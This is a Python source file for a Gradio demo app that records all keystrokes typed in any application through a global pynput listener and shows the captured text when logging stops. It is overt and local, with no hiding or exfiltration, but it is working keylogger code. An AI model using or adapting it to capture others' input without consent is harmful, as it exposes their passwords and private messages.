import threading
import time
from pynput import keyboard
import gradio as gr

class KeyloggerState:
    def __init__(self):
        self.log_string = ""
        self.logging_active = False
        self.listener_thread = None
        self.listener = None
        self.log_lock = threading.Lock() 

keylogger = KeyloggerState()

def on_press(key):
    """Callback function for key press events."""
    with keylogger.log_lock:
        if not keylogger.logging_active:
            return
        try:
            char = key.char
            keylogger.log_string += char
        except AttributeError:
            if key == keyboard.Key.space:
                keylogger.log_string += ' '
            elif key == keyboard.Key.enter:
                keylogger.log_string += '[ENTER]\n'
            elif key == keyboard.Key.tab:
                keylogger.log_string += '[TAB]'
            elif key == keyboard.Key.backspace:
                keylogger.log_string = keylogger.log_string[:-1]
            else:
                keylogger.log_string += f'[{str(key).split(".")[-1].upper()}]'

def on_release(key):
    pass

def start_listener_thread():
    keylogger.listener = keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    )
    keylogger.listener.start()
    keylogger.listener.join()

def start_logging():
    if keylogger.logging_active:
        return "Keylogger is already running."

    keylogger.log_string = ""
    keylogger.logging_active = True
    keylogger.listener_thread = threading.Thread(target=start_listener_thread, daemon=True)
    keylogger.listener_thread.start()
    
    return "Keylogger STARTED. Recording global inputs... (Switch to another app/tab and type)"


def stop_logging():
    if not keylogger.logging_active:
        return "Keylogger is not running."
    keylogger.logging_active = False
    if keylogger.listener:
        try:
            keylogger.listener.stop()
        except Exception as e:
            pass
    time.sleep(0.1)
    with keylogger.log_lock:
        final_log = keylogger.log_string
        keylogger.log_string = ""
    return final_log or "Keylogger STOPPED. No input was recorded."

with gr.Blocks(title="Python Keylogger with Gradio") as demo:
    gr.Markdown("## ⌨️ Keystroke Logger")
    gr.Markdown(
        "**Instructions:**\n"
        "1. Click **START LOGGING**.\n"
        "2. Switch to any other application or tab and type anything.\n"
        "3. Come back and click **STOP LOGGING** to see the full recorded string."
    )
    
    status_output = gr.Textbox(
        label="Status / Final Output", 
        placeholder="Click 'START LOGGING' to begin.", 
        lines=10
    )
    
    with gr.Row():
        start_btn = gr.Button("START LOGGING", variant="primary")
        stop_btn = gr.Button("STOP LOGGING", variant="stop")

    start_btn.click(
        fn=start_logging, 
        outputs=status_output
    )
    
    stop_btn.click(
        fn=stop_logging, 
        outputs=status_output
    )

if __name__ == "__main__":
    try:
        demo.launch()
    except Exception as e:
        print(f"An error occurred: {e}")
        print("Ensure you have permissions to monitor global keyboard inputs.")